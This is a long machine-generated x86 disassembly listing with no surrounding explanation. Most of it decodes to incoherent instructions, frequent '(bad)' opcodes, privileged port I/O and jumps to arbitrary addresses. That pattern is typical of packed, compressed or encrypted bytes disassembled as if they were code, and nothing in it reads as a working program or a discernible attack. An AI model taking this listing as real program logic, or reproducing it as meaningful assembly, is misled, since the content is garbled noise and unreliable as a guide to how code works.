  41eab1:	adc    al,0xb3
  41eab3:	pop    ds
  41eab4:	xchg   esp,eax
  41eab5:	push   eax
  41eab6:	call   0x7098:0xbe10bfdb
  41eabd:	les    edx,FWORD PTR [esi]
  41eabf:	aad    0xdb
  41eac1:	sbb    al,0xe4
  41eac3:	ja     0x41ead3
  41eac5:	mov    edi,0xc77e7e77
  41eaca:	xchg   esi,eax
  41eacb:	sahf   
  41eacc:	jge    0x41ea5b
  41eace:	jecxz  0x41ea5e
  41ead0:	cmp    DWORD PTR [edx+0x7bf6afc1],ebx
  41ead6:	outs   dx,BYTE PTR ds:[esi]
  41ead7:	call   0x5e7:0xbab59703
  41eade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eadf:	mov    cl,0xbb
  41eae1:	aas    
  41eae2:	das    
  41eae3:	adc    dh,dl
  41eae5:	jle    0x41eace
  41eae7:	adc    DWORD PTR [eax+0x99ae742],ecx
  41eaed:	outs   dx,BYTE PTR ds:[esi]
  41eaee:	dec    ebx
  41eaef:	add    esi,DWORD PTR [esi+0x35]
  41eaf2:	test   al,0x39
  41eaf4:	outs   dx,BYTE PTR ds:[esi]
  41eaf5:	cli    
  41eaf6:	cmp    BYTE PTR [ebp-0x3b],ah
  41eaf9:	inc    ebx
  41eafa:	cmp    DWORD PTR [edx+0x74],ecx
  41eafd:	push   cs
  41eafe:	cwde   
  41eaff:	daa    
  41eb00:	xchg   ebx,ebx
  41eb02:	in     al,dx
  41eb03:	jmp    0x13a8:0xec0ca60f
  41eb0a:	inc    esp
  41eb0b:	xchg   DWORD PTR [ecx],edi
  41eb0d:	js     0x41eb59
  41eb0f:	or     DWORD PTR [edx-0x43b055ac],eax
  41eb15:	retf   
  41eb16:	add    eax,0x48649609
  41eb1b:	outs   dx,DWORD PTR ds:[esi]
  41eb1c:	shl    DWORD PTR [ebx+0x49],cl
  41eb1f:	call   0xa4f36797
  41eb24:	mov    bl,BYTE PTR [edx+0x16df43b2]
  41eb2a:	mov    edx,0x7b49ea95
  41eb2f:	mov    DWORD PTR [esi],ecx
  41eb31:	adc    ch,0xf6
  41eb34:	pop    ebp
  41eb35:	ins    BYTE PTR es:[edi],dx
  41eb36:	retf   
  41eb37:	pushf  
  41eb38:	out    dx,eax
  41eb39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb3a:	jl     0x41eb51
  41eb3c:	or     BYTE PTR [ecx+0x11],bh
  41eb3f:	fimul  WORD PTR [esi+0x6f]
  41eb42:	cld    
  41eb43:	cmp    dl,BYTE PTR [esi+0x14]
  41eb46:	and    al,0xc5
  41eb48:	xchg   dl,al
  41eb4a:	mov    ebp,0x97990e8
  41eb4f:	mov    ds:0x372edb99,al
  41eb54:	cmp    eax,0xf8af9014
  41eb59:	imul   eax,DWORD PTR [ebp+0x1],0xffffffcc
  41eb5d:	out    dx,al
  41eb5e:	cmp    edx,ecx
  41eb60:	jb     0x41eae3
  41eb62:	ret    
  41eb63:	std    
  41eb64:	and    BYTE PTR [ebx+0x670b8cb4],0x99
  41eb6b:	xchg   bl,cl
  41eb6d:	lods   al,BYTE PTR ds:[esi]
  41eb6e:	mov    dl,0x6b
  41eb70:	jo     0x41eb48
  41eb72:	(bad)  
  41eb73:	out    dx,eax
  41eb74:	idiv   al
  41eb76:	xchg   ecx,eax
  41eb77:	loope  0x41ebd6
  41eb79:	adc    al,0x72
  41eb7b:	std    
  41eb7c:	ins    DWORD PTR es:[edi],dx
  41eb7d:	fwait
  41eb7e:	mov    cl,0xfd
  41eb80:	mov    esp,0xa0c3841b
  41eb85:	mov    bl,0xff
  41eb87:	jae    0x41ebfb
  41eb89:	cmp    BYTE PTR [eax+0x1d],bh
  41eb8c:	mov    dl,0xcd
  41eb8e:	cmp    BYTE PTR [eax-0x5ed6e96b],dh
  41eb94:	push   ecx
  41eb95:	jge    0x41eb65
  41eb97:	rcl    ah,1
  41eb99:	sbb    al,0xcd
  41eb9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb9d:	sti    
  41eb9e:	push   edi
  41eb9f:	je     0x41eb41
  41eba1:	jbe    0x41eb64
  41eba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eba4:	aas    
  41eba5:	push   eax
  41eba6:	and    ah,BYTE PTR [ebx]
  41eba8:	fsubr  DWORD PTR [edx-0x20]
  41ebab:	ret    0xb189
  41ebae:	into   
  41ebaf:	pusha  
  41ebb0:	rol    eax,cl
  41ebb2:	sbb    ecx,esp
  41ebb4:	and    esi,DWORD PTR [edx+eiz*8-0x51abeb51]
  41ebbb:	in     eax,0x7
  41ebbd:	pop    esi
  41ebbe:	ins    BYTE PTR es:[edi],dx
  41ebbf:	cdq    
  41ebc0:	xor    eax,0x83a7206a
  41ebc5:	sub    esp,DWORD PTR [esi]
  41ebc7:	clc    
  41ebc8:	aad    0x29
  41ebca:	adc    al,0x8b
  41ebcc:	out    dx,eax
  41ebcd:	mov    ah,0x2f
  41ebcf:	aam    0x44
  41ebd1:	popf   
  41ebd2:	and    BYTE PTR [ebx],0x2b
  41ebd5:	mov    al,ds:0x109c5a91
  41ebda:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41ebdc:	cs jp  0x41ebd5
  41ebdf:	xor    BYTE PTR [ecx+0x30a8c192],0xa0
  41ebe6:	inc    eax
  41ebe7:	mov    ebp,0xbda20947
  41ebec:	cld    
  41ebed:	iret   
  41ebee:	xor    edi,esp
  41ebf0:	jmp    0x38032c72
  41ebf5:	jl     0x41eb96
  41ebf7:	pushf  
  41ebf8:	aaa    
  41ebf9:	es adc bl,al
  41ebfc:	fisub  WORD PTR [ecx+0xfd9d47b]
  41ec02:	pop    esi
  41ec03:	je     0x41ebbf
  41ec05:	jmp    0xfc0f0af7
  41ec0a:	add    ebp,DWORD PTR [esi+0x6701862e]
  41ec10:	fdivr  st,st(1)
  41ec12:	sub    eax,0xe023736d
  41ec17:	or     esp,esi
  41ec19:	adc    ebp,DWORD PTR [ebx+edi*4]
  41ec1c:	mov    al,ds:0x6923744f
  41ec21:	mov    DWORD PTR [ebx+0x39127d34],esp
  41ec27:	jns    0x41ec6d
  41ec29:	out    0xcd,eax
  41ec2b:	test   eax,0x59e47d9c
  41ec30:	cli    
  41ec31:	push   es
  41ec32:	fcom   st(4)
  41ec34:	in     eax,0x68
  41ec36:	out    0x8a,eax
  41ec38:	push   es
  41ec39:	popa   
  41ec3a:	jae    0x41ec5c
  41ec3c:	xchg   ecx,eax
  41ec3d:	sub    eax,0x3a4cc5f7
  41ec42:	push   eax
  41ec43:	scas   al,BYTE PTR es:[edi]
  41ec44:	sbb    eax,0x72226da8
  41ec49:	sbb    esp,DWORD PTR ds:0x2383f7d4
  41ec4f:	and    edx,eax
  41ec51:	xlat   BYTE PTR ds:[ebx]
  41ec52:	dec    edi
  41ec53:	mov    bl,0x7b
  41ec55:	sub    al,BYTE PTR [edx+0x59]
  41ec58:	cmp    eax,0x636c1724
  41ec5d:	push   ebx
  41ec5e:	inc    edi
  41ec5f:	push   es
  41ec60:	mov    eax,0xe4417deb
  41ec65:	add    eax,0x48ac6a07
  41ec6a:	mov    ds,WORD PTR [edx-0x479435c3]
  41ec70:	leave  
  41ec71:	iret   
  41ec72:	sbb    dl,ah
  41ec74:	pop    ecx
  41ec75:	sbb    edx,DWORD PTR [ecx-0x24ad2474]
  41ec7b:	and    al,0x7c
  41ec7d:	pushf  
  41ec7e:	mov    ds:0x6271e2ec,eax
  41ec83:	cmp    eax,0xe4d80367
  41ec88:	mov    dh,0xaa
  41ec8a:	cmp    eax,0x7e1e4f86
  41ec8f:	push   ds
  41ec90:	sbb    DWORD PTR [ebp+0x5dc376c4],esp
  41ec96:	repz mov ch,0xc0
  41ec99:	adc    edx,eax
  41ec9b:	pushf  
  41ec9c:	xchg   esp,eax
  41ec9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec9e:	les    ebx,FWORD PTR [edi-0x73fee46c]
  41eca4:	mov    ds:0xbf8cec72,al
  41eca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecaa:	inc    esi
  41ecab:	test   BYTE PTR [ecx-0x8],dh
  41ecae:	mov    esi,0xe40a48f6
  41ecb3:	mov    edi,0xbd8b8650
  41ecb8:	or     eax,0xfa794d1a
  41ecbd:	adc    eax,0xf78ac112
  41ecc2:	call   0xf0cc2456
  41ecc7:	cmp    edx,DWORD PTR [edx]
  41ecc9:	sbb    ch,BYTE PTR [ebp+0x53]
  41eccc:	ja     0x41ed48
  41ecce:	test   BYTE PTR [eax+0x7a],0xf3
  41ecd2:	xchg   edi,eax
  41ecd3:	inc    edx
  41ecd4:	cmp    eax,0xc78c54d6
  41ecd9:	xor    edi,DWORD PTR [edx+0x26]
  41ecdc:	ret    
  41ecdd:	push   esp
  41ecde:	retf   0x86a8
  41ece1:	xchg   ebp,eax
  41ece2:	jne    0x41ecc0
  41ece4:	ins    BYTE PTR es:[edi],dx
  41ece5:	(bad)  
  41ece6:	dec    esp
  41ece7:	aam    0x27
  41ece9:	dec    ebx
  41ecea:	push   ecx
  41eceb:	aaa    
  41ecec:	sub    BYTE PTR [esi],bh
  41ecee:	outs   dx,BYTE PTR ds:[esi]
  41ecef:	ja     0x41ecd6
  41ecf1:	jl     0x41ecd8
  41ecf3:	stos   DWORD PTR es:[edi],eax
  41ecf4:	adc    BYTE PTR [eax],0xf6
  41ecf7:	cdq    
  41ecf8:	inc    ecx
  41ecf9:	gs cs dec esi
  41ecfc:	mov    ah,0xa7
  41ecfe:	xchg   edi,eax
  41ecff:	inc    edx
  41ed00:	test   al,0xfb
  41ed02:	cwde   
  41ed03:	pop    ebx
  41ed04:	xchg   esi,eax
  41ed05:	loopne 0x41ecdd
  41ed07:	xor    BYTE PTR [ecx+0x7f55d443],al
  41ed0d:	cmp    ch,ch
  41ed0f:	fidivr DWORD PTR [ebx-0xd]
  41ed12:	cmp    eax,0xd4bfb288
  41ed17:	mov    DWORD PTR [edi],esp
  41ed19:	pop    ecx
  41ed1a:	ins    BYTE PTR es:[edi],dx
  41ed1b:	out    0x83,al
  41ed1d:	jp     0x41ed87
  41ed1f:	aad    0xe9
  41ed21:	pop    ds
  41ed22:	std    
  41ed23:	mov    esi,0xc6199737
  41ed28:	push   0x11
  41ed2a:	add    ebp,DWORD PTR ds:0xd5039f08
  41ed30:	mov    eax,0x6510b8f1
  41ed35:	hlt    
  41ed36:	popa   
  41ed37:	jge    0x41edaf
  41ed39:	shr    DWORD PTR [edi+0x40],cl
  41ed3c:	adc    ebp,esp
  41ed3e:	ins    DWORD PTR es:[edi],dx
  41ed3f:	rcl    BYTE PTR ds:0x30accf6d,1
  41ed45:	mov    edi,0x8e47e78c
  41ed4a:	mov    dl,0x4b
  41ed4c:	sar    DWORD PTR [edx+eiz*4],1
  41ed4f:	xchg   edi,eax
  41ed50:	outs   dx,DWORD PTR ds:[esi]
  41ed51:	ja     0x41ed80
  41ed53:	xor    DWORD PTR [esi-0x18],esi
  41ed56:	pop    ss
  41ed57:	mov    ah,0x52
  41ed59:	fistp  WORD PTR [esi+0x2f]
  41ed5c:	ret    0xd1c0
  41ed5f:	add    edi,eax
  41ed61:	xchg   esi,eax
  41ed62:	daa    
  41ed63:	aam    0x27
  41ed65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed66:	push   ds
  41ed67:	xor    bl,BYTE PTR fs:[edi-0x47]
  41ed6b:	add    BYTE PTR [ebx],dh
  41ed6d:	les    ebp,FWORD PTR [ebx+0x20]
  41ed70:	xor    DWORD PTR [ebx+0x60],ebx
  41ed73:	xor    eax,0xde4df14f
  41ed78:	push   eax
  41ed79:	inc    ebp
  41ed7a:	jge    0x41edc7
  41ed7c:	sbb    eax,0x85eb242
  41ed81:	std    
  41ed82:	dec    eax
  41ed83:	cmc    
  41ed84:	xchg   DWORD PTR ds:0x388944f3,edx
  41ed8a:	pop    es
  41ed8b:	shl    BYTE PTR [edx-0x401c254],0x90
  41ed92:	out    0xd5,eax
  41ed94:	mov    dh,0x1e
  41ed96:	imul   BYTE PTR [eax-0x32]
  41ed99:	test   bl,ah
  41ed9b:	push   edi
  41ed9c:	dec    ebx
  41ed9d:	cwde   
  41ed9e:	xchg   esp,eax
  41ed9f:	and    eax,0x31feb11e
  41eda4:	push   cs
  41eda5:	sub    edi,DWORD PTR [edx+0x27]
  41eda8:	mov    edx,0x8a201caf
  41edad:	jl     0x41ee28
  41edaf:	inc    ebp
  41edb0:	pusha  
  41edb1:	mov    bh,0xae
  41edb3:	jle    0x41ed4c
  41edb5:	cli    
  41edb6:	sbb    DWORD PTR [ebx-0x3e],eax
  41edb9:	dec    eax
  41edba:	pusha  
  41edbb:	sbb    eax,0xdfc52c7d
  41edc0:	add    BYTE PTR [ecx+eax*4+0x22],al
  41edc4:	stos   DWORD PTR es:[edi],eax
  41edc5:	call   0x2d7a73ec
  41edca:	out    dx,eax
  41edcb:	(bad)  
  41edcc:	push   esp
  41edcd:	dec    edx
  41edce:	fst    DWORD PTR [esp+eax*8]
  41edd1:	inc    esi
  41edd2:	jmp    0x1d46b8d9
  41edd7:	jmp    0x41eda6
  41edd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edda:	sub    DWORD PTR [ebp+0x4bcd094e],edx
  41ede0:	mov    BYTE PTR [ebp-0x55e13817],dh
  41ede6:	mov    eax,0x84f6a229
  41edeb:	frstor ds:0xfd96d4c9
  41edf1:	lods   al,BYTE PTR ds:[esi]
  41edf2:	and    BYTE PTR [ecx-0x3df8192c],0x11
  41edf9:	dec    edi
  41edfa:	mov    dh,0xb6
  41edfc:	jns    0x41ee11
  41edfe:	stos   DWORD PTR es:[edi],eax
  41edff:	adc    bh,BYTE PTR [ecx+edx*2-0x56a4f77]
  41ee06:	pushf  
  41ee07:	dec    esi
  41ee08:	or     esp,edx
  41ee0a:	fwait
  41ee0b:	sub    al,bh
  41ee0d:	sbb    edx,DWORD PTR [esp+ebp*8-0x58]
  41ee11:	dec    ecx
  41ee12:	push   es
  41ee13:	fsubr  DWORD PTR [eax+0x6b]
  41ee16:	fist   WORD PTR [esp+ebx*2+0x7659050b]
  41ee1d:	xchg   esp,eax
  41ee1e:	mov    eax,0x879bb6e4
  41ee23:	sbb    BYTE PTR [ecx-0x2f],bl
  41ee26:	mov    ebx,DWORD PTR [edx]
  41ee28:	mov    ecx,DWORD PTR [ebp-0x5694c30]
  41ee2e:	lock sbb esp,DWORD PTR [esi]
  41ee31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee32:	nop
  41ee33:	xor    cl,al
  41ee35:	(bad)  
  41ee36:	push   ds
  41ee37:	add    eax,0x362510ce
  41ee3c:	fdivr  DWORD PTR [edx-0x40f33b4f]
  41ee42:	stos   BYTE PTR es:[edi],al
  41ee43:	out    0x4f,eax
  41ee45:	lods   al,BYTE PTR ds:[esi]
  41ee46:	add    al,0xe5
  41ee48:	mov    ebp,0x32ff2990
  41ee4d:	ror    dl,cl
  41ee4f:	jno    0x41ede8
  41ee51:	into   
  41ee52:	jno    0x41ee5c
  41ee54:	ins    BYTE PTR es:[edi],dx
  41ee55:	aas    
  41ee56:	popa   
  41ee57:	aaa    
  41ee58:	lods   eax,DWORD PTR ds:[esi]
  41ee59:	cmp    eax,0x4049178a
  41ee5e:	inc    esi
  41ee5f:	adc    eax,0x11ec7edf
  41ee64:	mov    al,ds:0xa3c5e662
  41ee69:	cmp    al,0x85
  41ee6b:	pop    ds
  41ee6c:	mov    ch,0x4e
  41ee6e:	faddp  st(4),st
  41ee70:	shl    DWORD PTR [ecx-0x2e43f889],0xd2
  41ee77:	inc    esi
  41ee78:	shr    BYTE PTR [esi-0x2f],1
  41ee7b:	mov    eax,ds:0x6e91bc55
  41ee80:	adc    ebp,DWORD PTR [ebx]
  41ee82:	scas   eax,DWORD PTR es:[edi]
  41ee83:	in     eax,0xd2
  41ee85:	mov    al,0xe
  41ee87:	mov    ecx,0xb7a93c94
  41ee8c:	xchg   esi,eax
  41ee8d:	push   es
  41ee8e:	sub    al,0x5f
  41ee90:	scas   eax,DWORD PTR es:[edi]
  41ee91:	aad    0x4e
  41ee93:	aaa    
  41ee94:	mov    al,0x83
  41ee96:	push   es
  41ee97:	lods   al,BYTE PTR ds:[esi]
  41ee98:	mov    ds:0xbb3df863,eax
  41ee9d:	dec    edx
  41ee9e:	ret    
  41ee9f:	pop    ebx
  41eea0:	pop    ebx
  41eea1:	mov    ah,0xb3
  41eea3:	lock ret 0xcb64
  41eea7:	mov    dh,BYTE PTR [ecx+edx*2]
  41eeaa:	out    0x27,al
  41eeac:	xor    edx,esp
  41eeae:	pop    esp
  41eeaf:	sbb    al,0x78
  41eeb1:	xor    BYTE PTR [esi],ch
  41eeb3:	mov    DWORD PTR [edi],edi
  41eeb5:	(bad)  
  41eeb6:	fld    DWORD PTR [ecx+0x7391819d]
  41eebc:	mov    dh,0x45
  41eebe:	cld    
  41eebf:	out    0xb0,al
  41eec1:	and    eax,0x7b29ca85
  41eec6:	xlat   BYTE PTR ds:[ebx]
  41eec7:	dec    ebp
  41eec8:	mov    dl,0x3d
  41eeca:	int    0x91
  41eecc:	xor    eax,0x22658f6b
  41eed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eed2:	and    al,0xf9
  41eed4:	pop    edx
  41eed5:	cmp    DWORD PTR [esi+0x6f270d67],esp
  41eedb:	mov    esi,0x35ec52ad
  41eee0:	push   es
  41eee1:	rol    BYTE PTR [eax+ebx*2],0x5a
  41eee5:	add    BYTE PTR [ebp+0x24],bl
  41eee8:	sar    BYTE PTR [ebx+0xef40b55],1
  41eeee:	aad    0x70
  41eef0:	cmp    al,0xb5
  41eef2:	(bad)  
  41eef4:	cwde   
  41eef5:	sbb    eax,0xd5d6d651
  41eefa:	mov    al,0x36
  41eefc:	mov    edx,0xa3221015
  41ef01:	fisub  DWORD PTR [eax+0x4c]
  41ef04:	and    BYTE PTR ds:0x3492cb04,bl
  41ef0a:	pop    edx
  41ef0b:	dec    ebx
  41ef0c:	(bad)  
  41ef0d:	(bad)  
  41ef0e:	int3   
  41ef0f:	cmp    ah,BYTE PTR [edi+0x4b]
  41ef12:	jmp    DWORD PTR [edi-0x6e523239]
  41ef18:	es scas al,BYTE PTR es:[edi]
  41ef1a:	scas   eax,DWORD PTR es:[edi]
  41ef1b:	jge    0x41eef0
  41ef1d:	sti    
  41ef1e:	adc    eax,DWORD PTR [edx-0x54]
  41ef21:	rcl    DWORD PTR [ebp+0x3b989ed5],0xf
  41ef28:	ins    DWORD PTR es:[edi],dx
  41ef29:	xor    al,0xcb
  41ef2b:	in     eax,dx
  41ef2c:	cmp    eax,DWORD PTR [ebx+0x63b3db4d]
  41ef32:	in     eax,0xfe
  41ef34:	(bad)  
  41ef36:	popa   
  41ef37:	fsub   QWORD PTR [esi+0x3b]
  41ef3a:	xor    DWORD PTR cs:[ecx-0x38731097],edx
  41ef41:	retf   0x4908
  41ef44:	add    DWORD PTR [edi-0x35],0x74
  41ef48:	sub    eax,0x980f7211
  41ef4d:	push   ebx
  41ef4e:	pop    ds
  41ef4f:	sti    
  41ef50:	xor    edi,edx
  41ef52:	mov    edi,0x2ad832a3
  41ef57:	and    al,0xd1
  41ef59:	mov    ah,0xd2
  41ef5b:	maskmovq mm4,mm3
  41ef5e:	adc    al,0x28
  41ef60:	data16 hlt 
  41ef62:	xchg   cx,ax
  41ef64:	mov    al,0xe3
  41ef66:	pop    ecx
  41ef67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef68:	sub    edx,DWORD PTR [ebx]
  41ef6a:	(bad)  
  41ef6b:	in     al,0x7e
  41ef6d:	(bad)  
  41ef6e:	xor    eax,0xa67c9bb8
  41ef73:	push   ecx
  41ef74:	icebp  
  41ef75:	sub    al,0xea
  41ef77:	adc    ebp,DWORD PTR [edi-0x47]
  41ef7a:	cdq    
  41ef7b:	je     0x41ef83
  41ef7d:	dec    ecx
  41ef7e:	inc    ebp
  41ef7f:	xor    DWORD PTR [ebp+0x5],ebp
  41ef82:	mov    esp,0xaf08ceca
  41ef87:	push   edx
  41ef88:	mov    esi,0x214727a0
  41ef8d:	cs push 0x1285459a
  41ef93:	add    ecx,edx
  41ef95:	jmp    0x63f9ffab
  41ef9a:	add    DWORD PTR [eax-0x58],ebp
  41ef9d:	das    
  41ef9e:	jno    0x41ef36
  41efa0:	stos   BYTE PTR es:[edi],al
  41efa1:	xchg   ebp,eax
  41efa2:	mov    ecx,0xf3a39770
  41efa7:	xchg   ecx,eax
  41efa8:	or     esi,DWORD PTR [eax]
  41efaa:	xor    ecx,esi
  41efac:	nop
  41efad:	int    0x62
  41efaf:	add    al,0x90
  41efb1:	rcr    BYTE PTR [esi-0x6e],0x9e
  41efb5:	iret   
  41efb6:	clc    
  41efb7:	jae    0x41efe1
  41efb9:	cwde   
  41efba:	push   ebp
  41efbb:	sbb    al,0x74
  41efbd:	repnz daa 
  41efbf:	sub    DWORD PTR ds:0xcc8fd456,ebp
  41efc5:	pop    esp
  41efc6:	xchg   esi,eax
  41efc7:	and    eax,0x2a94b4af
  41efcc:	mov    BYTE PTR [ebp+0x35],al
  41efcf:	ja     0x41f035
  41efd1:	cmc    
  41efd2:	mov    dh,0x3e
  41efd4:	lds    esp,FWORD PTR [ecx+eax*1]
  41efd7:	or     eax,0xe13450e9
  41efdc:	mov    ds:0x1d377db6,eax
  41efe1:	sub    esp,ecx
  41efe3:	sbb    al,0xb
  41efe5:	sbb    BYTE PTR [ecx-0x55],dl
  41efe8:	mov    ecx,0x1461f180
  41efed:	test   eax,0x924731b5
  41eff2:	rcr    DWORD PTR ds:0xfb401b4f,cl
  41eff8:	bound  ebp,QWORD PTR ds:0xea4593ef
  41effe:	inc    edx
  41efff:	out    dx,al
  41f000:	mov    ds:0xd62e929c,al
  41f005:	in     al,0x69
  41f007:	test   eax,0xa4a1f4d1
  41f00c:	js     0x41f04f
  41f00e:	inc    edi
  41f00f:	inc    ecx
  41f010:	add    BYTE PTR [ebp+0x3f],cl
  41f013:	leave  
  41f014:	xchg   ecx,eax
  41f015:	pop    ecx
  41f016:	sub    DWORD PTR ds:0x19fa4d25,eax
  41f01c:	jmp    0x41efdb
  41f01e:	sub    ecx,ebp
  41f020:	pop    ds
  41f021:	dec    esp
  41f022:	xchg   edi,eax
  41f023:	mov    BYTE PTR [edi-0x3466444e],dh
  41f029:	(bad)  
  41f02a:	or     esp,DWORD PTR [ecx+0x7d494803]
  41f030:	jp     0x41f036
  41f032:	movlps xmm4,QWORD PTR [ebx-0x40a6cd9b]
  41f039:	loop   0x41f048
  41f03b:	in     al,0xfa
  41f03d:	ffree  st(6)
  41f03f:	aaa    
  41f040:	jecxz  0x41f05b
  41f042:	aas    
  41f043:	sar    BYTE PTR [ecx+0x7b],1
  41f046:	ss (bad) 
  41f048:	(bad)  
  41f049:	mov    esp,0xaa7b5c8e
  41f04e:	les    esi,FWORD PTR ds:0xf9654bf1
  41f054:	shr    esp,1
  41f056:	sbb    al,0x1d
  41f058:	xchg   ebp,eax
  41f059:	clc    
  41f05a:	out    0x94,al
  41f05c:	pusha  
  41f05d:	and    bh,al
  41f05f:	or     BYTE PTR [edx+0x2f],ch
  41f062:	call   0xd69be966
  41f067:	mov    al,0xd1
  41f069:	xor    BYTE PTR [esi],0xa8
  41f06c:	ficom  WORD PTR ds:0xde04ca07
  41f072:	(bad)  
  41f073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f074:	stos   BYTE PTR es:[edi],al
  41f075:	in     eax,0xb4
  41f077:	test   eax,0x868114c9
  41f07c:	sub    al,0x22
  41f07e:	shl    bl,cl
  41f080:	arpl   WORD PTR [edx-0x55],cx
  41f083:	cdq    
  41f084:	sbb    BYTE PTR [edi],dl
  41f086:	(bad)  
  41f087:	fisttp QWORD PTR [edx+ecx*2-0x3b]
  41f08b:	retf   
  41f08c:	and    BYTE PTR [edi-0x5bdddc0d],0x6d
  41f093:	sahf   
  41f094:	aad    0x80
  41f096:	and    eax,DWORD PTR [ecx-0x56]
  41f099:	mov    ebx,0x81409e0e
  41f09e:	mov    esp,0xc89ef7e4
  41f0a3:	aad    0x2a
  41f0a5:	leave  
  41f0a6:	xchg   ecx,eax
  41f0a7:	aas    
  41f0a8:	mov    al,0x73
  41f0aa:	xor    esp,DWORD PTR [edi-0x3a]
  41f0ad:	fsubr  st(2),st
  41f0af:	(bad)  
  41f0b1:	enter  0x122f,0xf5
  41f0b5:	ret    
  41f0b6:	push   ebp
  41f0b7:	pop    eax
  41f0b8:	push   0x8
  41f0ba:	sbb    bl,BYTE PTR [ebx-0x57e6b74a]
  41f0c0:	ret    0x83ed
  41f0c3:	nop
  41f0c4:	mov    ebx,0xdfe1e7c4
  41f0c9:	adc    eax,0x28911572
  41f0ce:	or     DWORD PTR ds:0x74b0764,edi
  41f0d4:	push   ds
  41f0d5:	les    edi,FWORD PTR [eax]
  41f0d7:	pop    ss
  41f0d8:	cld    
  41f0d9:	mov    di,0x981f
  41f0dd:	fldcw  WORD PTR [esi+0x49ce41d5]
  41f0e3:	xor    eax,0xc94b1251
  41f0e8:	dec    ebp
  41f0e9:	jp     0x41f0fb
  41f0eb:	ds enter 0x7129,0x10
  41f0f0:	pop    ds
  41f0f1:	ret    0x9293
  41f0f4:	jle    0x41f149
  41f0f6:	cli    
  41f0f7:	dec    ebx
  41f0f8:	pop    esi
  41f0f9:	dec    edx
  41f0fa:	mov    esp,0x1b7a56c
  41f0ff:	fs cld 
  41f101:	cli    
  41f102:	loop   0x41f11f
  41f104:	(bad)  
  41f105:	(bad)  
  41f106:	push   ecx
  41f107:	and    BYTE PTR [ecx-0x35],dl
  41f10a:	cmp    ecx,0x6e2aa8cb
  41f110:	xchg   edi,eax
  41f111:	push   esi
  41f112:	outs   dx,DWORD PTR ds:[esi]
  41f113:	add    BYTE PTR [ebp-0x5c],0x9f
  41f117:	add    al,0x5f
  41f119:	call   0x6033:0xfddb11
  41f120:	cmp    BYTE PTR [ebx+0x1d],cl
  41f123:	fucom  st(0)
  41f125:	xchg   esp,eax
  41f126:	adc    esi,DWORD PTR [edx]
  41f128:	mov    dh,0x72
  41f12a:	cmp    BYTE PTR [edi],0x99
  41f12d:	push   ebx
  41f12e:	aas    
  41f12f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f130:	sbb    cl,BYTE PTR [ebx-0x1ea59a61]
  41f136:	inc    ebx
  41f137:	clc    
  41f138:	mov    ds:0x992c2bde,al
  41f13d:	xchg   esp,eax
  41f13e:	mov    bh,0x28
  41f140:	push   ss
  41f141:	loop   0x41f161
  41f143:	(bad)  [ebx-0x2c23ffb4]
  41f149:	aas    
  41f14a:	(bad)  
  41f14b:	arpl   dx,si
  41f14d:	lahf   
  41f14e:	sub    ebp,ebp
  41f150:	sub    al,0x2e
  41f152:	push   edx
  41f153:	pop    esi
  41f154:	xlat   BYTE PTR ds:[ebx]
  41f155:	imul   ecx,DWORD PTR [ebx],0x11
  41f158:	sbb    ebp,DWORD PTR [ecx-0xbfba204]
  41f15e:	pop    eax
  41f15f:	out    0x1e,eax
  41f161:	enter  0x353d,0xd6
  41f165:	pop    ebp
  41f166:	call   0xb0cb7534
  41f16b:	fdiv   QWORD PTR [ebp-0x7af0550c]
  41f171:	cmp    al,0x93
  41f173:	div    edx
  41f175:	push   ebp
  41f177:	mov    bh,0xb1
  41f179:	test   BYTE PTR [ecx],bh
  41f17b:	jg     0x41f1f9
  41f17d:	aam    0xd4
  41f17f:	inc    edi
  41f180:	cmc    
  41f181:	popa   
  41f182:	inc    ebp
  41f183:	mov    ch,0x84
  41f185:	stc    
  41f186:	mov    dl,0xe9
  41f188:	or     BYTE PTR [edi-0x343106ae],dh
  41f18e:	mov    ebx,0x91576546
  41f193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f194:	jne    0x41f206
  41f196:	or     BYTE PTR [ebx+ecx*8-0x3a],al
  41f19a:	ret    
  41f19b:	pop    es
  41f19c:	pushf  
  41f19d:	aam    0xc3
  41f19f:	mov    BYTE PTR [edi],dl
  41f1a1:	adc    edx,edx
  41f1a3:	jp     0x41f1cf
  41f1a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1a6:	push   ds
  41f1a7:	and    dl,BYTE PTR [esi+0x4f017689]
  41f1ad:	cwde   
  41f1ae:	mov    gs,WORD PTR [edi]
  41f1b0:	leave  
  41f1b1:	stos   DWORD PTR es:[edi],eax
  41f1b2:	imul   eax,ebp,0x1a9744a3
  41f1b8:	je     0x41f1c1
  41f1ba:	push   esp
  41f1bb:	sub    DWORD PTR [ebx],edx
  41f1bd:	data16 xor al,BYTE PTR [edi+0x60222571]
  41f1c4:	popa   
  41f1c5:	shl    BYTE PTR [eax],0x3
  41f1c8:	inc    edx
  41f1c9:	retf   0xe5fc
  41f1cc:	adc    ch,dh
  41f1ce:	jmp    0x1c4ad9f1
  41f1d3:	call   0x8304b8
  41f1d8:	mov    esp,0x99d3a090
  41f1dd:	pop    edx
  41f1de:	sub    eax,0xaf0d14bc
  41f1e3:	and    ebp,DWORD PTR [edi+0x957070e]
  41f1e9:	and    al,0x8e
  41f1eb:	gs out dx,al
  41f1ed:	frstor [ebp+0x6c]
  41f1f0:	test   BYTE PTR [ebx-0x58],0x52
  41f1f4:	test   eax,0x73f8cb13
  41f1f9:	add    eax,0xcdea673a
  41f1fe:	lds    ebp,FWORD PTR [edi-0x75]
  41f201:	mov    ebx,0xfce7c9a6
